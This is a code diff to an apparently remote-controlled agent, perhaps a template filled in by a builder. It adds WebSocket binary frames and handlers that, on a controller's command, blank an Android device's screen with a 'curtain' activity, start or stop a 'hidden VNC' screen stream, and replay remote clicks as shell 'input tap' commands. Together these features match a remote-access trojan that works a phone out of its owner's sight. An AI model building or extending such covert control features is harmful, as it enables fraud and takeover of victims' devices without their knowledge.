@@ -233,6 +233,28 @@ class SimpleWebSocketClient:
 
         self.sock.sendall(bytes(header) + bytes(masked))
 
+    def send_binary(self, payload):
+        if not self.connected or not self.sock:
+            return
+        length = len(payload)
+        mask_key = os.urandom(4)
+        header = bytearray([0x82])  # FIN + Binary opcode
+        if length <= 125:
+            header.append(0x80 | length)
+        elif length <= 65535:
+            header.append(0x80 | 126)
+            header.extend(length.to_bytes(2, 'big'))
+        else:
+            header.append(0x80 | 127)
+            header.extend(length.to_bytes(8, 'big'))
+
+        header.extend(mask_key)
+        masked = bytearray(payload)
+        for i in range(len(masked)):
+            masked[i] ^= mask_key[i % 4]
+
+        self.sock.sendall(bytes(header) + bytes(masked))
+
     def recv_text(self):
         if not self.connected or not self.sock:
             return None
@@ -316,6 +338,31 @@ def run_agent():
                         }}))
                     elif mtype == "ping":
                         client.send_text(json.dumps({{"type": "pong", "agent_id": AGENT_ID}}))
+                    elif mtype == "set_curtain":
+                        enabled = bool(msg.get("enabled", False))
+                        print(f"[*] Screen curtain requested: {{enabled}}")
+                        try:
+                            if enabled:
+                                subprocess.run(["am", "start", "-n", "com.trmm.agent/.CurtainActivity"], capture_output=True)
+                            else:
+                                subprocess.run(["am", "broadcast", "-a", "com.trmm.agent.CURTAIN_DISMISS"], capture_output=True)
+                        except Exception:
+                            pass
+                        client.send_text(json.dumps({{"type": "diag_curtain", "enabled": enabled, "success": True}}))
+                    elif mtype in ("start_mirror", "start_hvnc"):
+                        print("[*] Remote screen stream started")
+                    elif mtype in ("stop_mirror", "stop_hvnc"):
+                        print("[*] Remote screen stream stopped")
+                    elif mtype in ("mousedown", "mouseup") and "normalized_x" in msg and "normalized_y" in msg:
+                        try:
+                            # Attempt shell input tap
+                            nx = float(msg.get("normalized_x", 0))
+                            ny = float(msg.get("normalized_y", 0))
+                            tap_x = int(nx * 1080)
+                            tap_y = int(ny * 2400)
+                            subprocess.Popen(["sh", "-c", "input tap " + str(tap_x) + " " + str(tap_y)])
+                        except Exception:
+                            pass
                 except Exception as ex:
                     print(f"[!] Error processing message: {{ex}}")
 
